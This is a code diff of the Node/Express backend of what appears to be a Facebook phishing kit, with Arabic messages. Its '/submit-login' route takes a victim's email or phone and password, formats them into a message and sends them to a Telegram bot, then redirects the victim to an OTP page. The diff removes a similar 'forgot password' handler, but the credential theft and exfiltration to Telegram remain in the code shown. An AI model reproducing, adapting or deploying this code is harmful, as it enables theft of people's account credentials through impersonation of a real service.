@@ -34,7 +34,6 @@ async function sendTelegramMessage(message) {
     }
 }
 
-// ========== اختبار البوت ==========
 app.get('/test', async (req, res) => {
     await sendTelegramMessage('✅ <b>البوت شغال!</b> 🎉');
     res.send('✅ تم إرسال رسالة اختبار');
@@ -61,28 +60,6 @@ app.post('/submit-login', async (req, res) => {
         msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
         msg += `📧 <b>البريد / الهاتف:</b>\n<code>${email}</code>\n\n`;
         msg += `🔐 <b>كلمة المرور:</b>\n<code>${password}</code>\n\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-        msg += `🔗 <a href="https://facebook-login.vercel.app">📊 عرض الموقع</a>`;
-        await sendTelegramMessage(msg);
-        
-        res.json({ success: true, redirect: '/otp' });
-    } catch (err) {
-        console.error('❌ خطأ:', err.message);
-        res.status(500).json({ success: false });
-    }
-});
-
-// ========== استقبال "نسيت كلمة المرور" ==========
-app.post('/submit-forgot', async (req, res) => {
-    try {
-        const { email } = req.body;
-        console.log('📥 استلام نسيت كلمة المرور:', email);
-        
-        let msg = `🔑 <b>نسيت كلمة المرور - Facebook</b>\n`;
-        msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
-        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
-        msg += `📧 <b>البريد / الهاتف:</b>\n<code>${email}</code>\n\n`;
-        msg += `📌 <b>الحالة:</b> طلب استعادة الحساب\n\n`;
         msg += `━━━━━━━━━━━━━━━━━━━━\n`;
         msg += `🔗 <a href="https://facebook-login.vercel.app">📊 عرض الموقع</a>`;
         await sendTelegramMessage(msg);
